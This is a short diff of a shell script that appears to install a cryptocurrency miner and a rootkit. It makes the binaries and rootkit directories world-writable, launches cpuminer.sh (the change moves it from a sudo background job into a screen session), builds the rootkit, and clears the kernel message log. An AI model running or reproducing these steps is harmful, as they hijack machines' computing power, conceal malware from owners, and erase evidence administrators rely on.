@@ -11,7 +11,7 @@ chmod 777 *
 chmod 777 ./binaries/*
 chmod 777 ./rootkit/*
 ls
-sudo ./cpuminer.sh & 
+screen ./cpuminer.sh
 cd rootkit
 make
 dmesg -C
